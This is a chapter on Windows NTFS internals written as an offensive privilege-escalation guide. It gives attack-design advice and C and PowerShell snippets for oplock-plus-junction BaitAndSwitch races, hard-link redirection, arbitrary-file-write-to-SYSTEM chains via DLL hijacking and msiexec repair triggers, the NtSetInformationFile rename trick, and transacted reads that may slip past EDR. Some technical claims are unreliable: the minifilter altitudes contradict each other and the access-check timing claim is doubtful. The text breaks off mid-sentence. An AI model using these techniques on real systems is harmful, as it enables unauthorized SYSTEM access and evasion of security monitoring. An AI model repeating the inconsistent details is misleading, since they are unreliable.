# Chapter 06 — Windows Filesystem Security: NTFS Internals, Reparse Points, Oplocks, and LPE Chains

> **Scope:** This chapter covers the Windows filesystem from a security research perspective.
> Topics include NTFS on-disk architecture, file operation security semantics, reparse points
> and link types at the kernel level, hard link security implications, opportunistic lock
> mechanics and exploitation, the BaitAndSwitch TOCTOU pattern, the canonical arbitrary-file-write
> to LPE chain, NTFS transactions (TxF), and minifilter driver architecture as an EDR bypass
> surface.

---

## 1. The I/O Request Pipeline: A Security Perspective

Understanding where security checks happen in the I/O stack is prerequisite for understanding
why certain vulnerability patterns exist.

### 1.1 From CreateFile to Disk

```
User-mode:
  CreateFile("C:\path\file.txt", GENERIC_READ, FILE_SHARE_READ, NULL,
             OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL)
    ↓
Kernel transition:
  NtCreateFile(
    ObjectAttributes.ObjectName = "\??\C:\path\file.txt",
    DesiredAccess               = GENERIC_READ,
    ShareAccess                 = FILE_SHARE_READ,
    CreateDisposition           = FILE_OPEN,
    CreateOptions               = ...)
    ↓
I/O Manager:
  [1] Parse ObjectAttributes.ObjectName via ObpLookupObjectName
      → \??\C: resolved via process Device Map → \Device\HarddiskVolume3
      → Remaining path "\path\file.txt" passed to NTFS parse routine
  [2] Create IRP_MJ_CREATE packet
  [3] Send IRP down the filter manager stack
    ↓
Filter Manager (FltMgr.sys):
  [4] Pre-operation callbacks — each registered minifilter at its altitude
      (AV: altitude 320000; EDR: altitude 120000; etc.)
    ↓
NTFS.sys:
  [5] SeAccessCheck() against file's SECURITY_DESCRIPTOR
      (Check: does caller's token satisfy the file's DACL for GENERIC_READ?)
  [6] Check sharing mode against existing FILE_OBJECT opens on the same FCB
  [7] Look up file in MFT via $I30 B-tree
  [8] Process REPARSE_POINT attribute if present:
      → Re-issue IRP with substituted path (back to step 1)
      → Max 63 reparse iterations (STATUS_REPARSE_POINT_LOOP)
  [9] Open FCB (File Control Block), create CCB, return FILE_OBJECT
    ↓
Filter Manager:
  [10] Post-operation callbacks
    ↓
I/O Manager:
  [11] Complete IRP → return HANDLE to caller
```

**Critical security timing:** Step [5] (access check) happens AGAINST THE JUNCTION DIRECTORY
ITSELF, before step [8] (reparse point traversal). This means when a privileged process opens
`C:\AttackerDir\secret.dll` and `C:\AttackerDir` is a junction to `C:\Windows\System32\`,
the access check at step [5] is performed on `C:\AttackerDir` (the junction directory) —
NOT on `C:\Windows\System32\`. If the junction directory has permissive permissions
(it's in a user-writable location), the check passes, and then the reparse happens.

This is the fundamental security weakness that oplock+junction exploits rely on.

---

## 2. NTFS Architecture for Security Researchers

### 2.1 Master File Table (MFT)

Every file and directory on an NTFS volume is represented by one or more **MFT records**
(also called FILE records). The MFT is itself a file (`$MFT`) at the beginning of the volume.

Structure of a single MFT record (1KB by default):

```
FILE Record Header:
  Magic:           "FILE"
  UpdateSequence:  (for cross-sector coherence)
  LogFileSeqNum:   (for crash recovery via $LogFile)
  Flags:           IN_USE | DIRECTORY
  NextAttributeId: counter for new attributes
  MFT record index: (this record's position in MFT)

Attribute Stream:
  ├── $STANDARD_INFORMATION (type 0x10)
  │     Creation, modification, access, MFT timestamps
  │     File attributes (hidden, system, readonly, compressed, encrypted)
  │     Owner ID, Security ID (index into $Secure stream)
  │
  ├── $FILE_NAME (type 0x30) — ONE PER HARD LINK
  │     Filename (Unicode), parent directory MFT reference
  │     Timestamps (note: $STANDARD_INFORMATION timestamps are the "real" ones,
  │     $FILE_NAME timestamps are harder to modify — forensic artifact)
  │     Flags: WIN32_ONLY | DOS_ONLY | WIN32_AND_DOS | POSIX
  │
  ├── $DATA (type 0x80) — file content
  │     Small files: resident (data inline in MFT record)
  │     Large files: non-resident (run list of cluster extents)
  │     Named streams: $DATA:<stream_name> (Alternate Data Streams)
  │
  ├── $REPARSE_POINT (type 0xC0) — present only if reparse point
  │     ReparseTag: IO_REPARSE_TAG_SYMLINK or IO_REPARSE_TAG_MOUNT_POINT
  │     ReparseData: target path (for symlinks/junctions)
  │
  ├── $INDEX_ROOT (type 0x90) — directories only
  │     B-tree root for $I30 (directory listing index)
  │
  ├── $INDEX_ALLOCATION (type 0xA0) — directories only
  │     B-tree internal/leaf nodes (on disk)
  │
  └── $SECURITY_DESCRIPTOR (type 0x50) — file's SD
        (usually not stored inline; referenced from $Secure system file)
```

**Security descriptor storage:** NTFS does not store a unique SD per file. Instead, it uses
a volume-wide SD cache file (`$Secure`). Each file's `$STANDARD_INFORMATION` contains a
security ID (SID — not to be confused with the SID in tokens) that is an index into `$Secure`.
This means thousands of files can share the same SD by referencing the same entry.

**Forensic implication:** Timestomping — modifying `$STANDARD_INFORMATION` timestamps — is
easy (API: `SetFileTime`). Modifying `$FILE_NAME` timestamps is harder (requires direct
journal manipulation or raw disk write). Incident responders compare both; discrepancies
indicate tampering.

### 2.2 Alternate Data Streams (ADS)

A file can have multiple `$DATA` attributes. The default (unnamed) stream is the file's main
content. Additional named streams are **Alternate Data Streams**:

```
C:\path\file.txt          ← default $DATA stream
C:\path\file.txt:hidden   ← named ADS "hidden"
C:\path\file.txt:Zone.Identifier  ← Windows Mark-of-the-Web
```

ADS data:
- Is hidden from standard `dir` and Explorer listings
- Appears in `dir /R` and can be accessed via `Get-Item -Stream *`
- Counts toward disk quota
- Is preserved on copy within the same NTFS volume
- Is STRIPPED when copying to non-NTFS (FAT, network share, etc.)

**Security research use cases:**
- Malware hides payloads in ADS (evades simple file hash scanning)
- ADS can contain executable code (runnable via `wscript C:\file.txt:payload.js`)
- `Zone.Identifier:$DATA` contains the `[ZoneTransfer]` mark; removing it kills SmartScreen
- EDR filters that enumerate files by name may miss ADS — test by checking stream names

**Tools:**
```powershell
# Enumerate all streams on a file
Get-Item C:\path\file.txt -Stream *

# Read a specific ADS
Get-Content C:\path\file.txt -Stream hidden

# Find files with non-standard ADS in a directory
Get-ChildItem C:\path -Recurse |
  Get-Item -Stream * |
  Where-Object { $_.Stream -notmatch '^\$DATA$|^Zone.Identifier$' }
```

### 2.3 $OBJECT_ID Attribute

NTFS supports an `$OBJECT_ID` attribute (type 0x40) that assigns a volume-unique GUID to a
file. This GUID persists across renames and moves within the same volume. Windows uses it for
shell shortcuts (`.lnk` files store the GUID to track moved targets), DFS reparse points,
and some distributed file system features.

**Security note:** `$OBJECT_ID` can be used by security tools to track file identity across
renames — an anti-evasion mechanism. Malware that renames itself to evade path-based detections
can still be tracked via its GUID.

### 2.4 NTFS Permissions (ACL Evaluation)

NTFS files have a DACL stored in `$SECURE`. The access check sequence:

```
SeAccessCheck(SecurityDescriptor, SubjectSecurityContext, DesiredAccess, ...)

Algorithm:
1. Check if caller is Owner → grant READ_CONTROL + WRITE_DAC (even if DACL denies)
2. Process DACL ACEs in order:
   a. ACCESS_DENIED_ACE → if intersects DesiredAccess → DENY immediately
   b. ACCESS_ALLOWED_ACE → accumulate granted bits
3. If accumulated bits satisfy DesiredAccess → ALLOW
4. Otherwise → DENY

KEY RULE: Explicit DENY ACEs processed before ALLOW, but ONLY if they appear
          before the ALLOW ACE in the DACL. ACE ordering matters.
          Windows APIs that set security on files (SetFileSecurity) reorder ACEs
          into canonical order: Explicit Deny → Explicit Allow → Inherited Deny → Inherited Allow
```

**Inheritance:** Directory ACEs propagate to children according to inheritance flags:
- `OBJECT_INHERIT_ACE (OI)`: propagate to files in the directory
- `CONTAINER_INHERIT_ACE (CI)`: propagate to subdirectories
- `INHERIT_ONLY_ACE (IO)`: do not apply to the container itself; only to descendants
- `NO_PROPAGATE_INHERIT_ACE (NP)`: apply to direct children but do not propagate further

**Common misconfiguration:** A directory has a permissive inherited ACE (`CI+OI`) that
propagates world-write to all subdirectories and files, even when specific files should
be protected. Always check inherited ACEs separately from explicit ACEs:

```powershell
# Check for world-writable files/dirs (icacls approach)
icacls C:\ProgramData\Vendor /findsid *S-1-1-0 /t  # Everyone SID
# Or:
Get-Acl C:\ProgramData\Vendor\* | Where-Object {
  $_.Access | Where-Object { $_.IdentityReference -match "Everyone" -and
                              $_.FileSystemRights -match "Write" }
}
```

---

## 3. Reparse Points: Architecture and Attack Use

### 3.1 Reparse Point Structure

A reparse point is an NTFS `$REPARSE_POINT` attribute on a file or directory. The kernel's
I/O manager checks for the `FILE_ATTRIBUTE_REPARSE_POINT` flag during path resolution and,
if present, reads the reparse buffer and re-issues the IRP with the substituted path.

Binary format of the reparse data buffer:

```c
typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;          // Identifies the type (IO_REPARSE_TAG_SYMLINK, etc.)
    USHORT ReparseDataLength;   // Length of the ReparseData field
    USHORT Reserved;
    union {
        struct {                // For IO_REPARSE_TAG_SYMLINK
            USHORT SubstituteNameOffset;  // Offset in PathBuffer for NT path
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;       // Offset for user-visible path (Explorer)
            USHORT PrintNameLength;
            ULONG  Flags;                 // SYMLINK_FLAG_RELATIVE (0x1) or absolute (0x0)
            WCHAR  PathBuffer[1];         // Substitute + Print names concatenated
        } SymbolicLinkReparseBuffer;
        struct {                // For IO_REPARSE_TAG_MOUNT_POINT (junction)
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {                // For third-party tags (tagged with vendor GUID)
            GUID   ReparseGuid;
            UCHAR  DataBuffer[1];
        } GenericReparseBuffer;
    };
} REPARSE_DATA_BUFFER;
```

### 3.2 Reparse Tag Registry

| Tag Value | Constant | Description | Attack Relevance |
|---|---|---|---|
| `0xA000000C` | `IO_REPARSE_TAG_SYMLINK` | NTFS symbolic link | Requires privilege; cross-volume capable |
| `0xA0000003` | `IO_REPARSE_TAG_MOUNT_POINT` | Junction / mount point | No privilege required; directory-level redirect |
| `0x80000017` | `IO_REPARSE_TAG_CLOUD` | OneDrive stub | Traversal behavior depends on cloud provider filter |
| `0x8000001A` | `IO_REPARSE_TAG_APPEXECLINK` | App execution alias | Explorable for UWP bypass |
| `0x80000023` | `IO_REPARSE_TAG_LX_SYMLINK` | WSL symlink | WSL filesystem boundary |
| `0x8000001E` | `IO_REPARSE_TAG_WCI` | WCI container layer | Windows Container isolation |

**Third-party cloud storage tags:** Cloud provider reparse points (`IO_REPARSE_TAG_CLOUD_*`)
are processed by vendor minifilter drivers, not by NTFS directly. These drivers implement
their own traversal logic that may have weaker security validation than the kernel's native
reparse handling. Investigating third-party reparse traversal is an underexplored area.

### 3.3 NTFS Junction vs. NTFS Symlink vs. Object Manager Symlink vs. Hard Link

| Feature | NTFS Junction | NTFS File Symlink | Object Manager Symlink | Hard Link |
|---|---|---|---|---|
| **Target scope** | Directory only | File or directory | Any named object | File only |
| **Cross-volume** | ❌ Same volume | ✅ Yes | ✅ Yes | ❌ Same volume |
| **Privilege required** | None (own directory) | `SeCreateSymbolicLinkPrivilege` or Developer Mode | None (if target dir allows) | Write access to directory |
| **NTFS layer** | ✅ $REPARSE_POINT attr | ✅ $REPARSE_POINT attr | ❌ Object Manager only | ✅ $FILE_NAME attr |
| **OBJ_DONT_REPARSE blocks** | ✅ Yes | ✅ Yes | ❌ No (pre-NTFS) | N/A |
| **Win32 path visible** | ✅ Yes | ✅ Yes | ✅ Via `\\?\` path | ✅ Yes |
| **Absolute or relative** | Absolute NT path only | Both | Both | N/A |

**Attack design guidance:**

- **Use junctions** when you need directory-level redirection and have no special privileges.
  Junctions point to NT paths (`\Device\HarddiskVolume3\path`) and require the target to be
  a directory on the same volume.

- **Use Object Manager symlinks** in `\??` when you need to redirect a drive-letter path
  at the object manager layer, before NTFS sees it. These symlinks bypass `OBJ_DONT_REPARSE`
  because that flag only affects NTFS reparse traversal. Create via `DefineDosDevice` or
  `NtCreateSymbolicLinkObject`.

- **Use NTFS file symlinks** when cross-volume file-level redirection is needed, but this
  requires Developer Mode or privilege — significantly limiting unprivileged exploitability.

- **Use hard links** for "file identity redirect" primitives: creating a hard link to a
  privileged file, then exploiting a privileged operation that deletes-then-creates at the
  same name. The hard link ensures the file's MFT record remains accessible through the
  attacker's path after deletion.

### 3.4 Creating Reparse Points

```c
// Creating a junction (mount point) — unprivileged
// 1. Create directory
// 2. Open with FILE_FLAG_BACKUP_SEMANTICS + FILE_FLAG_OPEN_REPARSE_POINT
// 3. Set reparse point via FSCTL_SET_REPARSE_POINT

// Using Win32 CreateDirectory + DeviceIoControl:
HANDLE hDir = CreateFile(junctionPath,
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);

// Populate REPARSE_DATA_BUFFER with IO_REPARSE_TAG_MOUNT_POINT
// SubstituteName = "\??\" + targetPath  (NT path format)
DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT,
    &reparseBuffer, reparseBufferSize, NULL, 0, &bytesReturned, NULL);

// Deleting a reparse point:
DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, ...);
```

**Practical note:** `symboliclink-testing-tools` (Project Zero) provides `CreateMountPoint.exe`
which automates junction creation with proper NT path formatting. The tool handles the
`\??\` prefix correctly and can create junctions to non-existent target paths (useful for
staging the attack before the target is set up).

---

## 4. Hard Links: Security Implications

### 4.1 How Hard Links Work at the MFT Level

A hard link is a second (or third, etc.) `$FILE_NAME` attribute on the same MFT record.
From NTFS's perspective, there is ONE file (one MFT record, one data stream, one security
descriptor) and MULTIPLE directory entries pointing to it.

```
MFT Record #4721:
  $STANDARD_INFORMATION: Created=2024-01-01, Modified=2024-01-02
  $FILE_NAME[0]: "secret.txt" → parent dir = C:\Alice\Documents\ (MFT #1234)
  $FILE_NAME[1]: "public.txt" → parent dir = C:\Public\ (MFT #5678)
  $DATA: [file content — shared by both paths]
  $SECURITY_DESCRIPTOR: [SD — applied regardless of which path is used to open]
```

**Key implication:** The security descriptor controls access from **either path**. If the SD
grants Alice full control and denies Everyone else, then `C:\Public\public.txt` is also
protected — the directory `C:\Public\` may allow world-read, but the file's own DACL
prevents access.

However, the directory's DACL controls who can **create** entries (including hard links).
If `C:\Public\` is world-writable, any user can create a hard link there to any file they
have `FILE_WRITE_ATTRIBUTES` access to.

### 4.2 CreateHardLink Security Requirements

`CreateHardLink(newPath, existingPath, NULL)` requires:
1. The caller has `FILE_WRITE_ATTRIBUTES` on the existing file (to add the new $FILE_NAME)
2. The caller has write access to the directory where `newPath` will be created
3. Both paths must be on the same NTFS volume

**Token-level check:** `CreateHardLink` performs an access check on the existing file using
the caller's token. If the file has a DACL that denies the caller `FILE_WRITE_ATTRIBUTES`,
the hard link creation fails. This prevents unprivileged users from creating hard links to
SYSTEM-owned files they cannot write.

**Exception: backup operators.** Users with `SeBackupPrivilege` can open files with
`FILE_FLAG_BACKUP_SEMANTICS`, bypassing DACL checks. In some configurations, this allows
hard link creation to otherwise restricted files.

### 4.3 Hard Link LPE Pattern

The classic hard link LPE pattern operates through **file deletion races**:

```
PRECONDITION:
  - Privileged service (SYSTEM) performs this sequence:
    1. Validate file C:\Logs\output.txt doesn't exist (or delete it)
    2. Create C:\Logs\output.txt and write data
  - Attacker has write access to C:\Logs\

ATTACK:
  1. Wait for SYSTEM to delete C:\Logs\output.txt (or time before creation)
  2. Create hard link: CreateHardLink("C:\Logs\output.txt", "C:\AttackerTarget.txt")
     Where AttackerTarget.txt is a file the attacker wants written to
  3. SYSTEM's CreateFile("C:\Logs\output.txt") → opens the hard-linked file
  4. SYSTEM writes content → writes to C:\AttackerTarget.txt as SYSTEM
  5. AttackerTarget.txt is now attacker-controlled content at a privileged path
```

**Note:** Modern Windows applies additional protections. Privileged services typically use
`FILE_FLAG_OPEN_REPARSE_POINT` or `OBJ_DONT_REPARSE`, but hard links do NOT involve reparse
points — they are pure MFT-level aliases. Hard link attacks are therefore not blocked by
`OBJ_DONT_REPARSE`.

The delete-before-create TOCTOU window with hard links is commonly combined with oplocks
(see Section 6) for reliable timing.

---

## 5. Opportunistic Locks (Oplocks): Mechanics and Exploitation

### 5.1 What is an Oplock?

An **opportunistic lock** is a mechanism that allows a process to request notification from
the kernel when another process attempts to access a specific file. The notification fires
*before* the second process's file operation completes — the second process is blocked,
waiting for the oplock holder to acknowledge the break.

Oplocks were designed for caching optimization (clients cache file data; if another client
opens the file, the cache must be invalidated before the second client sees stale data).
From a security perspective, they are a **synchronization primitive** that converts timing
races into attacker-controlled synchronization points.

### 5.2 Oplock Types

| Oplock Type | Request Code | Break Trigger | Exploit Suitability |
|---|---|---|---|
| **Level 1** (exclusive) | `FSCTL_REQUEST_OPLOCK_LEVEL_1` | Any other open | Poor — breaks too broadly |
| **Level 2** (shared read) | `FSCTL_REQUEST_OPLOCK_LEVEL_2` | Write or exclusive open | Poor — can't use for write operations |
| **Batch** | `FSCTL_REQUEST_BATCH_OPLOCK` | Any open by another process | Moderate |
| **Filter** | `FSCTL_REQUEST_FILTER_OPLOCK` | Open for read or write by another | Good |
| **Atomic (Win7+)** | `FSCTL_REQUEST_OPLOCK` | Configurable via flags | **Best** — full control |

**The atomic oplock (FSCTL_REQUEST_OPLOCK)** introduced in Windows 7 is the recommended
type for security research because:
1. The break condition is configurable: `OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE`
   fires when another process opens the file with any conflicting access
2. The notification is asynchronous (overlapped I/O) — the oplock holder receives the break
   on a thread while the victim process is blocked in the kernel
3. The break notification includes information about the violating access (whether it's a
   read, write, or handle-only open)

### 5.3 Oplock API

```c
// Open the bait file — must use FILE_FLAG_OVERLAPPED and sharing that allows future opens
HANDLE hBait = CreateFile(
    "C:\\BaitDir\\target.dll",
    GENERIC_READ,
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    NULL, OPEN_EXISTING,
    FILE_FLAG_OVERLAPPED, NULL);

// Request atomic oplock — will complete (via OVERLAPPED) when oplock breaks
REQUEST_OPLOCK_INPUT_BUFFER inputBuffer = {
    .StructureVersion  = REQUEST_OPLOCK_CURRENT_VERSION,
    .StructureLength   = sizeof(REQUEST_OPLOCK_INPUT_BUFFER),
    .RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ |
                            OPLOCK_LEVEL_CACHE_HANDLE,
    .Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST
};

REQUEST_OPLOCK_OUTPUT_BUFFER outputBuffer = {
    .StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION,
    .StructureLength  = sizeof(REQUEST_OPLOCK_OUTPUT_BUFFER)
};

OVERLAPPED overlapped = { 0 };
overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

DeviceIoControl(hBait,
    FSCTL_REQUEST_OPLOCK,
    &inputBuffer,  sizeof(inputBuffer),
    &outputBuffer, sizeof(outputBuffer),
    NULL,
    &overlapped);
// Returns immediately; oplock is now held

// Wait for oplock break (blocks until victim process touches the bait file):
WaitForSingleObject(overlapped.hEvent, INFINITE);
// ← At this point: victim process is BLOCKED in NtCreateFile

// [RACE WINDOW — do your swap here]
// 1. Remove C:\BaitDir\  (if attacker created it)
// 2. Create junction C:\BaitDir → C:\Windows\System32
// 3. Acknowledge the oplock break

// Acknowledge the break — victim process will continue after this
REQUEST_OPLOCK_INPUT_BUFFER ackBuffer = {
    .StructureVersion  = REQUEST_OPLOCK_CURRENT_VERSION,
    .StructureLength   = sizeof(REQUEST_OPLOCK_INPUT_BUFFER),
    .RequestedOplockLevel = OPLOCK_LEVEL_CACHE_NONE,
    .Flags = REQUEST_OPLOCK_INPUT_FLAG_ACK
};
DeviceIoControl(hBait, FSCTL_REQUEST_OPLOCK, &ackBuffer, sizeof(ackBuffer),
    NULL, 0, NULL, &overlapped2);
```

The `SetOpLock.exe` tool from `symboliclink-testing-tools` automates this entire flow:
```
SetOpLock.exe "C:\BaitDir\target.dll" rh
# Outputs: "Waiting for oplock break..."
# Then blocks until victim opens the file, then signals the attacker
```

### 5.4 Oplock Corner Cases

**Corner case 1: File opened with `FILE_SHARE_NONE`**
If the victim opens the bait file with exclusive access (`FILE_SHARE_NONE`), the oplock
break fires but the victim may receive `STATUS_SHARING_VIOLATION` if the oplock holder
still has the file open. The attacker must close the bait handle before acknowledging.

**Corner case 2: `FILE_FLAG_OPEN_REPARSE_POINT`**
If the victim uses `FILE_FLAG_OPEN_REPARSE_POINT` (Win32) or `OBJ_DONT_REPARSE` (NT),
the kernel opens the junction directory itself rather than following it. The BaitAndSwitch
attack fails because the junction is not traversed. Auditing for this flag's absence is
the first check in code review.

**Corner case 3: Process Monitor interference**
ProcMon's minifilter driver (`PROCMON24.SYS`) opens files to record access — this can
trigger oplock breaks prematurely during testing. Disable ProcMon or use kernel debugging
instead.

---

## 6. BaitAndSwitch: The Oplock + Junction TOCTOU Exploit Pattern

### 6.1 Conceptual Foundation

The BaitAndSwitch technique converts a **timing-based race** into a **synchronization-based
exploit**. Instead of hoping the kernel scheduler gives you a window between check and use,
you *force* the privileged process to pause at the exact moment you need by placing an
oplock on the file it will access.

**The invariant that makes it work:** Windows does not re-validate paths after an oplock
break. The kernel holds the in-flight IRP (the pending open call) and resumes it exactly
where it left off — but the filesystem state may have changed during the break.

### 6.2 Step-by-Step: Detailed Protocol

```
PHASE 1: SETUP (attacker prepares the bait)

  Action: Attacker creates the bait environment
    mkdir C:\Exploit\StagingDir
    copy C:\Attacker\payload.dll C:\Exploit\StagingDir\target.dll

  Action: Attacker requests oplock on the bait file
    handle = CreateFile("C:\Exploit\StagingDir\target.dll", ...)
    DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK, ...) → async, returns immediately

  State: Oplock is held; kernel is monitoring accesses to the bait file

PHASE 2: TRIGGER (victim's operation begins)

  Action: Privileged service (SYSTEM) starts an operation that touches target.dll
    Example: service validates path, then calls:
    MoveFile("C:\Attacker\data.tmp", "C:\Exploit\StagingDir\target.dll")
    OR:
    CreateFile("C:\Exploit\StagingDir\target.dll", GENERIC_WRITE, ...)

  Kernel action: Before the open completes, kernel detects the oplock conflict
    → Fires oplock break notification to attacker (via overlapped I/O completion)
    → Victim's thread is SUSPENDED in kernel (blocking in NtCreateFile)

PHASE 3: SWAP (attacker replaces the directory)

  Action: Attacker's oplock break handler executes:
    RemoveDirectory("C:\Exploit\StagingDir")  ← remove the real dir
    CreateJunction("C:\Exploit\StagingDir", "C:\Windows\System32")  ← plant junction

  State: C:\Exploit\StagingDir is now a junction pointing to C:\Windows\System32

PHASE 4: RELEASE (victim continues through the trap)

  Action: Attacker acknowledges oplock break
    DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK, ackBuffer, ...) → release

  Kernel action: Victim's suspended IRP resumes
    Path resolution continues: "C:\Exploit\StagingDir\target.dll"
    → C:\Exploit\StagingDir is now a junction → redirected to C:\Windows\System32\
    → Full path = C:\Windows\System32\target.dll
    → SYSTEM completes the operation on C:\Windows\System32\target.dll

OUTCOME:
  - SYSTEM has written to / renamed / created C:\Windows\System32\target.dll
  - Attacker controls the content (if the operation involved attacker data)
  - Attacker has achieved arbitrary file write to System32 as SYSTEM
```

### 6.3 Reliable Timing and the "One-Shot" Property

Unlike traditional TOCTOU, BaitAndSwitch is **deterministic** — not a race. The victim
thread does not proceed until the attacker explicitly releases the oplock. This means:

1. There is no need for multiple attempts
2. The attacker can take as long as needed during phase 3
3. There is no CPU load required to "win" the race

The only timing constraint is that the oplock must be placed BEFORE the victim touches the
file. This is typically done by placing the oplock before starting or triggering the
vulnerable service action.

---

## 7. Arbitrary File Write → LPE Chain

### 7.1 The Canonical Chain (Forshaw's Methodology)

An **arbitrary file write** primitive means: an attacker can cause a SYSTEM process to
write attacker-controlled content to an attacker-influenced path. This is a common output
of other bugs (weak ACL on log directory, missing path validation in update service, etc.).

The conversion to LPE follows this chain:

```
CHAIN: Arbitrary File Write → DLL Hijacking → Code Execution as SYSTEM

Step 1: Identify the target
  - Find a process that runs as SYSTEM and loads DLLs without KnownDlls protection
  - OR find a Windows service that will be restarted
  - OR use Windows Installer repair (msiexec /fau) as a trigger

Step 2: Choose the DLL hijack path
  - DLL search order: process directory → %SYSTEMROOT%\System32 → %SYSTEMROOT%
  - If process writes to %SYSTEMROOT%\System32, the hijack target is there
  - If process writes to %ProgramFiles%\Vendor\, find a DLL loaded from there

Step 3: Use BaitAndSwitch to redirect the write
  - If the arbitrary write goes to C:\Temp\<guid>\output.dll:
    a. Create junction C:\Temp\<guid>\ → C:\Windows\System32\
    b. Service writes "output.dll" → lands in System32 as attacker-controlled content

Step 4: Name the DLL correctly
  - The write must produce a file with the correct name
  - Use NtSetInformationFile rename trick if needed to rename after write:

    // NtSetInformationFile rename trick (write without delete access on directory)
    FILE_RENAME_INFORMATION renameInfo = {
        .ReplaceIfExists = TRUE,
        .RootDirectory   = NULL,
        .FileNameLength  = targetLen,
        .FileName        = targetPath  // e.g., C:\Windows\System32\target.dll
    };
    NtSetInformationFile(hWrittenFile, &iosb, &renameInfo,
        sizeof(renameInfo) + targetLen, FileRenameInformation);

Step 5: Trigger DLL load
  - Restart the target service
  - OR trigger Windows Installer repair (msiexec /fau {PRODUCTGUID})
  - OR wait for scheduled task / auto-start

Step 6: Code execution as SYSTEM
  - DLL is loaded by SYSTEM process → DllMain runs → arbitrary code as SYSTEM
```

### 7.2 Windows Installer Repair Trigger

Windows Installer's repair feature (`msiexec /fau {productGUID}`) causes a SYSTEM process
to reinstall files from the MSI package. During repair, `msiexec.exe` runs as SYSTEM and
loads DLLs from multiple locations during the install.

This is the canonical "clean" trigger mechanism because:
- Every installed MSI product has a Product GUID enumerable from `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\`
- Repair can be triggered without elevation (user-level `msiexec /fau`)
- During repair, SYSTEM loads DLLs from the install directory, system directories, and temp paths

```powershell
# Find all installed products
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" |
  Get-ItemPropertyValue -Name ProductCode -ErrorAction SilentlyContinue

# Trigger repair
Start-Process msiexec -ArgumentList "/fau {PRODUCT-GUID}"
```

### 7.3 The NtSetInformationFile Rename Trick

When a privileged service creates a temp file and then renames it to the final destination,
the rename operation is another attack surface. If an attacker can intercept after the write
but before the rename:

```c
// Attacker's file: C:\Temp\arbitrary.tmp (attacker-written content)
// Destination: C:\Windows\System32\target.dll (privileged)

FILE_RENAME_INFORMATION *ri = malloc(sizeof(*ri) + sizeof(dstPath));
ri->ReplaceIfExists = TRUE;
ri->RootDirectory   = NULL;
ri->FileNameLength  = sizeof(dstPath);
memcpy(ri->FileName, dstPath, sizeof(dstPath));

// This call can move a file to any path as long as we have a handle with
// DELETE + SYNCHRONIZE rights — the access check is on the SOURCE handle,
// not the destination directory
NtSetInformationFile(hSrcFile, &iosb, ri,
    sizeof(*ri) + sizeof(dstPath),
    FileRenameInformation);
```

The key insight: `FileRenameInformation` requires `DELETE` access on the source file but
does NOT require write access to the target directory in all configurations — creating an
asymmetric access control situation exploited in several historical CVEs.

---

## 8. NTFS Transactions (TxF) — Limited Modern Applicability

Transactional NTFS (TxF) allows file operations within an ACID transaction — changes are
either all committed or all rolled back. Introduced in Windows Vista via `CreateTransaction`,
`CreateFileTransacted`, etc.

**Current status:** Microsoft deprecated TxF in Windows 8 and may remove it in a future
release. As of Windows 11, TxF is present but restricted:
- Many file operations refuse to work inside transactions
- Antivirus and security tools often have gaps in transaction-aware monitoring
- EDR minifilters may not receive `IRP_MJ_CREATE` callbacks for transacted file operations

**Residual attack surface:**
```c
// Create a transaction
HANDLE hTx = CreateTransaction(NULL, NULL, 0, 0, 0, INFINITE, NULL);

// Open file within transaction — some EDRs miss this
HANDLE hFile = CreateFileTransacted(
    "C:\\sensitive.txt",
    GENERIC_READ,
    FILE_SHARE_READ,
    NULL, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, NULL,
    hTx, NULL, NULL);

// Read file — may bypass EDR that doesn't monitor transacted I/O
ReadFile(hFile, buffer, bufferSize, &bytesRead, NULL);

// Roll back — file system is unchanged
RollbackTransaction(hTx);
```

**Modern limitation:** Most EDRs have updated their minifilters to handle transacted I/O.
TxF is primarily relevant as an evasion technique in older environments (pre-2020 EDR).

---

## 9. Minifilter Architecture and EDR Bypass Surface

### 9.1 The Filter Manager Model

The Filter Manager (`FltMgr.sys`) sits between the I/O Manager and filesystem drivers.
Minifilter drivers register with FltMgr and specify:
1. **Altitude** — a number determining processing order (higher altitude = earlier callback)
2. **Operations** — which IRP types to intercept (CREATE, READ, WRITE, SET_INFORMATION, etc.)
3. **Pre/post callbacks** — functions called before (and after) each operation reaches NTFS

```
I/O Manager sends IRP_MJ_CREATE
  ↓
FltMgr pre-operation dispatch (by altitude, descending):
  Altitude 420000: [AV/malware scanner] pre-op callback
  Altitude 328000: [Replication filter] pre-op callback
  Altitude 180000: [EDR] pre-op callback     ← most security filters here
  Altitude 100000: [Encryption driver] pre-op callback
  ↓
NTFS.sys processes IRP
  ↓
FltMgr post-operation dispatch (by altitude, ascending):
  Altitude 100000: [Encryption driver] post-op callback
  Altitude 180000: [EDR] post-op callback
  Altitude 420000: [AV] post-op callback
```

### 9.2 Altitude Number Registry

Microsoft maintains a public altitude registration database:

| Range | Category | Typical Occupants |
|---|---|---|
| 420000–429999 | FSFilter Anti-Virus | Top-tier AV/EDR endpoint protection |
| 400000–409999 | FSFilter Replication | Backup/replication products |
| 320000–329999 | FSFilter Quota Management | Disk quota enforcement |
| 180000–189999 | FSFilter Virtualization | Application virtualization |
| 120000–129999 | FSFilter Security Enhancer | EDR behavioral monitoring, DLP |
| 100000–109999 | FSFilter Copy Protection | DRM products |

**Attack implication:** Any I/O operation that reaches NTFS without passing through the
